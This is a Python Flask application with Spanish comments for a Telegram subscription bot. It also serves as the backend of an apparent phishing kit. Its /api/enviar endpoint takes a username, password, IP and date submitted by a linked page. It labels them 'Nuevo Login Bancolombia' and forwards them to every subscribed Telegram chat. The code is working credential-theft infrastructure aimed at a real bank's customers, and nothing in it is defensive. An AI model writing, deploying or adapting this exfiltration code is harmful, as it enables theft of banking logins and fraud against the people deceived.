# app.py
from telegram import Update, Bot
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
import os

# Variables de entorno
TOKEN_BOT = os.getenv('TELEGRAM_TOKEN')
if not TOKEN_BOT:
    raise ValueError("TELEGRAM_TOKEN no configurado")

# Flask
app = Flask(__name__)
CORS(app)

# Base de datos
db_url = os.getenv('DATABASE_URL', 'sqlite:///suscriptores.db')
if db_url.startswith('postgres://'):
    db_url = db_url.replace('postgres://', 'postgresql://', 1)
app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bot = Bot(token=TOKEN_BOT)

# Modelo
class Suscriptor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    chat_id = db.Column(db.String(50), unique=True, nullable=False)
    username = db.Column(db.String(100))
    nombre = db.Column(db.String(100))
    activo = db.Column(db.Boolean, default=True)

with app.app_context():
    db.create_all()

# ========== WEBHOOK TELEGRAM ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    """Recibe updates de Telegram"""
    try:
        update = Update.de_json(request.get_json(), bot)
        
        if update.message and update.message.text:
            chat_id = str(update.effective_chat.id)
            username = update.effective_user.username
            nombre = update.effective_user.first_name
            command = update.message.text
            
            if command == '/start':
                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
                
                if suscriptor:
                    if not suscriptor.activo:
                        suscriptor.activo = True
                        db.session.commit()
                        bot.send_message(chat_id, "✅ Suscripción reactivada!")
                    else:
                        bot.send_message(chat_id, "✅ Ya estás suscrito!")
                else:
                    nuevo = Suscriptor(chat_id=chat_id, username=username, nombre=nombre)
                    db.session.add(nuevo)
                    db.session.commit()
                    bot.send_message(
                        chat_id,
                        f"✅ ¡Bienvenido {nombre}!\n\n"
                        "Te has suscrito correctamente.\n"
                        "Recibirás todas las notificaciones.\n\n"
                        "Usa /stop para cancelar."
                    )
            
            elif command == '/stop':
                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
                if suscriptor and suscriptor.activo:
                    suscriptor.activo = False
                    db.session.commit()
                    bot.send_message(chat_id, "❌ Suscripción cancelada.")
                else:
                    bot.send_message(chat_id, "No estás suscrito.")
            
            elif command == '/status':
                suscriptor = Suscriptor.query.filter_by(chat_id=chat_id).first()
                total = Suscriptor.query.filter_by(activo=True).count()
                if suscriptor and suscriptor.activo:
                    bot.send_message(chat_id, f"✅ Estado: Activo\n👥 Total: {total}")
                else:
                    bot.send_message(chat_id, "❌ No estás suscrito. Usa /start")
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Error en webhook: {e}")
        return jsonify({'ok': False}), 500

# ========== API PARA TU PÁGINA ==========
@app.route('/api/enviar', methods=['POST'])
def enviar_a_suscriptores():
    """Recibe datos del formulario y los envía a suscriptores"""
    try:
        data = request.json
        
        mensaje = f"""
🔐 *Nuevo Login Bancolombia*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* `{data.get('usuario', 'N/A')}`
🔑 *Clave:* `{data.get('clave', 'N/A')}`
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* {data.get('ip', 'N/A')}
🕐 *Fecha:* {data.get('fecha', 'N/A')}
        """
        
        suscriptores = Suscriptor.query.filter_by(activo=True).all()
        enviados = 0
        
        for suscriptor in suscriptores:
            try:
                bot.send_message(
                    chat_id=suscriptor.chat_id,
                    text=mensaje,
                    parse_mode='Markdown'
                )
                enviados += 1
            except:
                pass
        
        return jsonify({
            'success': True,
            'enviados': enviados,
            'total_suscriptores': len(suscriptores)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/suscriptores', methods=['GET'])
def listar_suscriptores():
    """Lista suscriptores activos"""
    suscriptores = Suscriptor.query.filter_by(activo=True).all()
    return jsonify({
        'total': len(suscriptores),
        'suscriptores': [{'username': s.username, 'nombre': s.nombre} for s in suscriptores]
    })

@app.route('/')
def health():
    """Health check"""
    return jsonify({'status': 'online', 'bot': 'active'})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
